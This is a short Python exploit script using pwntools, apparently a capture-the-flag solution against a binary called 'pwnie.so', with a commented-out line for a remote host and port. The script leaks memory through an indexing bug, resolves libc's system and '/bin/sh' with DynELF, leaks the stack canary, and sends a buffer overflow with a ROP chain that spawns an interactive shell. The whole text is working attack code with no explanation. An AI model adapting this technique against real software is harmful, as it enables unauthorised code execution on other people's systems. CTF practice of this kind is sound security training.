from pwn import *

s = process("./pwnie.so", shell=True)
#s = remote("54.218.14.40", 3031)

s.recvuntil("?")

s.sendline("%d %d" % (0x34/4+7,1))

s.recvuntil("be ")

stack = struct.pack("i",int(s.recvline().strip()))
base = u32(stack)-0xfa81f8c+0xffa81ea8

def leak(addr):
	a = (addr-base-0x10000000)/4
	s.sendline("%d %d" % (a, 0xdeadbeef))

	s.recvuntil("be ")
	mem = struct.pack("i",int(s.recvline().strip()))
	print hex(addr), repr(mem)
	return mem


d = DynELF(leak, 0x80485f8, elf=ELF("./pwnie.so"))

sysoff = d.lookup('system','libc')
binshoff = d.libc.search("/bin/sh").next()

print repr(leak(sysoff))
print repr(leak(binshoff))

'''
for i in xrange(0x15):
	leak(base+0x10000000+4*i)
	print i
'''

cookie = leak(base+0x10000000+4*13)
s.sendline("1 1")

#opchain="Q"*20
ropchain=p32(sysoff)+"ABCD"+p32(binshoff)

s.recvuntil("cool.")
print repr(cookie)
s.sendline("A"*(0xe-4)+cookie+"ABCD"*3+ropchain)
s.interactive()
